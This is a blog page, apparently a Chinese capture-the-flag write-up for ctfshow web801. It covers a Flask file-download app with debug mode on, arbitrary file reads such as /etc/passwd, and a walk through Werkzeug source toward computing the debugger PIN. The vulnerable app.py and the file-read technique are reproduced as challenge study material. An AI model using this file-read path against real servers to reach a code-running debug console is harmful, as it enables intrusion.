@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="web801打开题目出现一串提示 1Welcome to ctfshow file download system, use &#x2F;file?filename&#x3D; to download file,my debug mode is enable.  提示debug模式已打开 尝试读取一下&#x2F;etc&#x2F;passwd发现可以读，那么直接读一下app.py 123456789101112131">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow入门常用姿势">
+<meta property="og:url" content="https://wanth3f1ag.top/2025/08/29/ctfshow%E5%85%A5%E9%97%A8%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="web801打开题目出现一串提示 1Welcome to ctfshow file download system, use &#x2F;file?filename&#x3D; to download file,my debug mode is enable.  提示debug模式已打开 尝试读取一下&#x2F;etc&#x2F;passwd发现可以读，那么直接读一下app.py 123456789101112131">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20250829163347951.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20250829164915498.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20250829164643413.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20250829165946373.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20250829171035207.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20250829172343751.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20250829172416537.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20250829183704166.png">
+<meta property="article:published_time" content="2025-08-29T08:29:08.000Z">
+<meta property="article:modified_time" content="2025-09-01T02:12:32.814Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="常用姿势">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20250829163347951.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ctfshow入门常用姿势</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">A6out</a></li><!--
+     --><!--
+       --><li><a href="/tags/">T6gs</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Catagory</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">s4arch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/08/29/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAsql%E6%B3%A8%E5%85%A5%E4%B9%8Bsqlite/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/08/29/ctfshow%E5%85%A5%E9%97%A8%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/08/29/ctfshow%E5%85%A5%E9%97%A8%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/&text=ctfshow入门常用姿势"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/08/29/ctfshow%E5%85%A5%E9%97%A8%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/&title=ctfshow入门常用姿势"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/08/29/ctfshow%E5%85%A5%E9%97%A8%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/&is_video=false&description=ctfshow入门常用姿势"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow入门常用姿势&body=Check out this article: https://wanth3f1ag.top/2025/08/29/ctfshow%E5%85%A5%E9%97%A8%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/08/29/ctfshow%E5%85%A5%E9%97%A8%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/&title=ctfshow入门常用姿势"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/08/29/ctfshow%E5%85%A5%E9%97%A8%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/&title=ctfshow入门常用姿势"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/08/29/ctfshow%E5%85%A5%E9%97%A8%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/&title=ctfshow入门常用姿势"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/08/29/ctfshow%E5%85%A5%E9%97%A8%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/&title=ctfshow入门常用姿势"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/08/29/ctfshow%E5%85%A5%E9%97%A8%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/&name=ctfshow入门常用姿势&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/08/29/ctfshow%E5%85%A5%E9%97%A8%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/&t=ctfshow入门常用姿势"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web801"><span class="toc-number">1.</span> <span class="toc-text">web801</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flask%E8%AE%A1%E7%AE%97pin%E5%80%BC"><span class="toc-number">1.1.</span> <span class="toc-text">#flask计算pin值</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ctfshow入门常用姿势
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wanTh3flag</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-08-29T08:29:08.000Z" class="dt-published" itemprop="datePublished">2025-08-29</time>
+        
+        (Updated: <time datetime="2025-09-01T02:12:32.814Z" class="dt-updated" itemprop="dateModified">2025-09-01</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/ctfshow/">ctfshow</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/" rel="tag">常用姿势</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="web801"><a href="#web801" class="headerlink" title="web801"></a>web801</h2><p>打开题目出现一串提示</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Welcome to ctfshow file download system, use /file?filename= to download file,my debug mode is enable.</span><br></pre></td></tr></table></figure>
+
+<p>提示debug模式已打开</p>
+<p>尝试读取一下&#x2F;etc&#x2F;passwd发现可以读，那么直接读一下app.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Welcome to ctfshow file download system, use /file?filename= to download file,my debug mode is enable.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/file&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">80</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>好像没啥用</p>
+<p>扫目录扫出一个&#x2F;console路由，访问一下看看</p>
+<p><img src="/../image/achieve/202411/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20250829163347951.png" alt="image-20250829163347951"></p>
+<p>翻译一下</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">控制台已锁定，需要输入PIN码解锁。您可以在运行服务器的shell的标准输出上找到打印出的PIN码。</span><br></pre></td></tr></table></figure>
+
+<p>这里的话需要输入PIN码，但是这个PIN码怎么来呢</p>
+<h3 id="flask计算pin值"><a href="#flask计算pin值" class="headerlink" title="#flask计算pin值"></a>#flask计算pin值</h3><p>当Flask开启调试模式（debug&#x3D;True）时，默认使用的是Werkzeug 内置调试器，而调试器可以在浏览器中交互式执行Python代码</p>
+<p>PIN码是Werkzeug 内置调试器生成的调试PIN，是一种Flask开发服务器在调试模式下的安全机制，所以我们需要正确的PIN码才能进入调试模式</p>
+<p>Werkzeug官方对Debugger PIN的介绍</p>
+<p><img src="/../image/achieve/202411/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20250829164915498.png" alt="image-20250829164915498"></p>
+<p>那这里的PIN码怎么生成以及获取呢？</p>
+<p>本地测试一下，写一个简单的flask</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20250829164643413.png" alt="image-20250829164643413"></p>
+<p>在shell中可以看到此时生成了一个PIN码，然后我们打个断点调试一下</p>
+<p>在app.run行打上断点，调试后步入app.py中的run函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        host: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        port: <span class="built_in">int</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        debug: <span class="built_in">bool</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        load_dotenv: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">        **options: t.<span class="type">Any</span>,</span></span><br><span class="line"><span class="params">    </span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">if</span> os.environ.get(<span class="string">&quot;FLASK_RUN_FROM_CLI&quot;</span>) == <span class="string">&quot;true&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> is_running_from_reloader():</span><br><span class="line">                click.secho(</span><br><span class="line">                    <span class="string">&quot; * Ignoring a call to &#x27;app.run()&#x27; that would block&quot;</span></span><br><span class="line">                    <span class="string">&quot; the current &#x27;flask&#x27; CLI command.\n&quot;</span></span><br><span class="line">                    <span class="string">&quot;   Only call &#x27;app.run()&#x27; in an &#x27;if __name__ ==&quot;</span></span><br><span class="line">                    <span class="string">&#x27; &quot;__main__&quot;\&#x27; guard.&#x27;</span>,</span><br><span class="line">                    fg=<span class="string">&quot;red&quot;</span>,</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> get_load_dotenv(load_dotenv):</span><br><span class="line">            cli.load_dotenv()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># if set, env var overrides existing value</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;FLASK_DEBUG&quot;</span> <span class="keyword">in</span> os.environ:</span><br><span class="line">                <span class="variable language_">self</span>.debug = get_debug_flag()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># debug passed to method overrides all other sources</span></span><br><span class="line">        <span class="keyword">if</span> debug <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="variable language_">self</span>.debug = <span class="built_in">bool</span>(debug)</span><br><span class="line"></span><br><span class="line">        server_name = <span class="variable language_">self</span>.config.get(<span class="string">&quot;SERVER_NAME&quot;</span>)</span><br><span class="line">        sn_host = sn_port = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> server_name:</span><br><span class="line">            sn_host, _, sn_port = server_name.partition(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> host:</span><br><span class="line">            <span class="keyword">if</span> sn_host:</span><br><span class="line">                host = sn_host</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> port <span class="keyword">or</span> port == <span class="number">0</span>:</span><br><span class="line">            port = <span class="built_in">int</span>(port)</span><br><span class="line">        <span class="keyword">elif</span> sn_port:</span><br><span class="line">            port = <span class="built_in">int</span>(sn_port)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            port = <span class="number">5000</span></span><br><span class="line"></span><br><span class="line">        options.setdefault(<span class="string">&quot;use_reloader&quot;</span>, <span class="variable language_">self</span>.debug)</span><br><span class="line">        options.setdefault(<span class="string">&quot;use_debugger&quot;</span>, <span class="variable language_">self</span>.debug)</span><br><span class="line">        options.setdefault(<span class="string">&quot;threaded&quot;</span>, <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        cli.show_server_banner(<span class="variable language_">self</span>.debug, <span class="variable language_">self</span>.name)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">from</span> werkzeug.serving <span class="keyword">import</span> run_simple</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            run_simple(t.cast(<span class="built_in">str</span>, host), port, <span class="variable language_">self</span>, **options)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="comment"># reset the first request information if the development server</span></span><br><span class="line">            <span class="comment"># reset normally.  This makes it possible to restart the server</span></span><br><span class="line">            <span class="comment"># without reloader and that stuff from an interactive shell.</span></span><br><span class="line">            <span class="variable language_">self</span>._got_first_request = <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+
+<p>发现有一段代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.serving <span class="keyword">import</span> run_simple</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    run_simple(t.cast(<span class="built_in">str</span>, host), port, <span class="variable language_">self</span>, **options)</span><br></pre></td></tr></table></figure>
+
+<p>这里从Werkzeug中导入了run_simple模块，并且还在try中用到了try_simple，我们跟进run_simple去看看</p>
+<p>找到跟debug有关的部分</p>
+<p><img src="/../image/achieve/202411/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20250829165946373.png" alt="image-20250829165946373"></p>
+<p>这里的话先是检测了是否开启debugger，那么这里很可能就是处理debug模式的代码，跟进DebuggedApplication看看</p>
+<p>首先进入<code>__init__</code>函数，看看这里都初始化了哪些东西</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self,</span></span><br><span class="line"><span class="params">    app: WSGIApplication,</span></span><br><span class="line"><span class="params">    evalex: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    request_key: <span class="built_in">str</span> = <span class="string">&quot;werkzeug.request&quot;</span>,</span></span><br><span class="line"><span class="params">    console_path: <span class="built_in">str</span> = <span class="string">&quot;/console&quot;</span>,</span></span><br><span class="line"><span class="params">    console_init_func: t.<span class="type">Callable</span>[[], <span class="built_in">dict</span>[<span class="built_in">str</span>, t.<span class="type">Any</span>]] | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    show_hidden_frames: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    pin_security: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    pin_logging: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> console_init_func:</span><br><span class="line">        console_init_func = <span class="literal">None</span></span><br><span class="line">    <span class="variable language_">self</span>.app = app</span><br><span class="line">    <span class="variable language_">self</span>.evalex = evalex</span><br><span class="line">    <span class="variable language_">self</span>.frames: <span class="built_in">dict</span>[<span class="built_in">int</span>, DebugFrameSummary | _ConsoleFrame] = &#123;&#125;</span><br><span class="line">    <span class="variable language_">self</span>.frame_contexts: <span class="built_in">dict</span>[<span class="built_in">int</span>, <span class="built_in">list</span>[t.ContextManager[<span class="literal">None</span>]]] = &#123;&#125;</span><br><span class="line">    <span class="variable language_">self</span>.request_key = request_key</span><br><span class="line">    <span class="variable language_">self</span>.console_path = console_path</span><br><span class="line">    <span class="variable language_">self</span>.console_init_func = console_init_func</span><br><span class="line">    <span class="variable language_">self</span>.show_hidden_frames = show_hidden_frames</span><br><span class="line">    <span class="variable language_">self</span>.secret = gen_salt(<span class="number">20</span>)</span><br><span class="line">    <span class="variable language_">self</span>._failed_pin_auth = Value(<span class="string">&quot;B&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">self</span>.pin_logging = pin_logging</span><br><span class="line">    <span class="keyword">if</span> pin_security:</span><br><span class="line">        <span class="comment"># Print out the pin for the debugger on standard out.</span></span><br><span class="line">        <span class="keyword">if</span> os.environ.get(<span class="string">&quot;WERKZEUG_RUN_MAIN&quot;</span>) == <span class="string">&quot;true&quot;</span> <span class="keyword">and</span> pin_logging:</span><br><span class="line">            _log(<span class="string">&quot;warning&quot;</span>, <span class="string">&quot; * Debugger is active!&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.pin <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                _log(<span class="string">&quot;warning&quot;</span>, <span class="string">&quot; * Debugger PIN disabled. DEBUGGER UNSECURED!&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                _log(<span class="string">&quot;info&quot;</span>, <span class="string">&quot; * Debugger PIN: %s&quot;</span>, <span class="variable language_">self</span>.pin)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="variable language_">self</span>.pin = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="variable language_">self</span>.trusted_hosts: <span class="built_in">list</span>[<span class="built_in">str</span>] = [<span class="string">&quot;.localhost&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>]</span><br><span class="line">    <span class="string">&quot;&quot;&quot;List of domains to allow requests to the debugger from. A leading dot</span></span><br><span class="line"><span class="string">    allows all subdomains. This only allows ``&quot;.localhost&quot;`` domains by</span></span><br><span class="line"><span class="string">    default.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 3.0.3</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>参数就不用看了，生成了一些调试器参数</p>
+<p><img src="/../image/achieve/202411/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20250829171035207.png" alt="image-20250829171035207"></p>
+<p>这里调用到一个pin函数，跟进看一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@property</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pin</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span> | <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(<span class="variable language_">self</span>, <span class="string">&quot;_pin&quot;</span>):</span><br><span class="line">        pin_cookie = get_pin_and_cookie_name(<span class="variable language_">self</span>.app)</span><br><span class="line">        <span class="variable language_">self</span>._pin, <span class="variable language_">self</span>._pin_cookie = pin_cookie  <span class="comment"># type: ignore</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">self</span>._pin</span><br></pre></td></tr></table></figure>
+
+<p>这段代码是用于获取调试器PIN的方法</p>
+<p>这里有一个装饰器<code>@property</code>，用于将类的方法变成只读属性或带逻辑的属性访问器</p>
+<p>先是检查是否已经生成了<code>_pin</code>属性，没有的话就调用get_pin_and_cookie_name方法去获取PIN和对应cookie名称</p>
